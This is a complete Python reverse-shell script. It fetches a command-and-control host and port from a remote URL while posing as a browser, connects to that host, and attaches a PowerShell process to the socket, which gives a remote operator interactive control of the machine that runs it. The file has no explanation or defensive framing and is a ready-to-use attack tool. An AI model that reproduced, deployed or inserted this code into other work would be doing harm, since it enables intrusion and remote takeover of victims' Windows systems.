import os, socket, subprocess, threading, urllib.request

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

def get_target():
    try:
        url = "http://remote.tinywifi.win/tcp.txt"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        raw = urllib.request.urlopen(req, timeout=10).read().decode().strip()
        raw = raw.replace("tcp://", "")
        host, port = raw.split(":")
        return host, int(port)
    except Exception as e:
        raise SystemExit(f"[!] Failed to fetch target: {e}")


host, port = get_target()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

p = subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
